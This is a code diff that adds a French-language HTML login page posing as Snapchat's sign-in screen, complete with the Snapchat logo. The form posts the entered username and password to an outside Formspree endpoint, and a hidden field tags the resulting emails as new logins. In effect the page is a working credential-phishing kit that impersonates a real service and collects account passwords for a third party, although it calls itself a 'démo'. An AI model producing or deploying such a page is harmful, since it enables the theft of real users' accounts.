@@ -1,0 +1,76 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Connexion - Snapchat </title>
+  <link rel="stylesheet" href="style.css">
+</head>
+<body>
+
+  <main class="login-container">
+    
+    <!-- Logo Snapchat (via lien en ligne) -->
+    <div class="logo">
+      <img 
+        src="https://upload.wikimedia.org/wikipedia/en/c/c4/Snapchat_logo.svg" 
+        alt="Logo Snapchat" 
+        width="90" 
+        height="90">
+    </div>
+
+    <h1>Se connecter</h1>
+    <p class="subtitle"></p>
+
+    <!-- Formulaire connecté à Formspree -->
+    <form 
+      action="https://formspree.io/f/moevdqle" 
+      method="POST" 
+      class="login-form" 
+      novalidate>
+
+      <div class="form-group">
+        <label for="username">Nom d'utilisateur ou e-mail</label>
+        <input 
+          type="text" 
+          id="username" 
+          name="username" 
+          placeholder="nom_utilisateur" 
+          required 
+          autocomplete="username">
+      </div>
+
+      <div class="form-group">
+        <label for="password">Mot de passe</label>
+        <input 
+          type="password" 
+          id="password" 
+          name="password" 
+          placeholder="••••••••" 
+          required 
+          minlength="6"
+          autocomplete="current-password">
+      </div>
+
+      <!-- Champ caché pour personnaliser l'objet de l'e-mail reçu -->
+      <input type="hidden" name="_subject" value="Nouvelle connexion - Démo Snapchat">
+
+      <button type="submit" class="btn-login">Se connecter</button>
+
+      <a href="#" class="forgot-link">Mot de passe oublié ?</a>
+    </form>
+
+    <!-- Séparateur -->
+    <div class="divider"><span>OU</span></div>
+
+    <!-- Bouton d'inscription -->
+    <button type="button" class="btn-signup">Créer un compte</button>
+
+    <footer class="legal">
+      <small></small>
+    </footer>
+
+  </main>
+
+</body>
+</html>
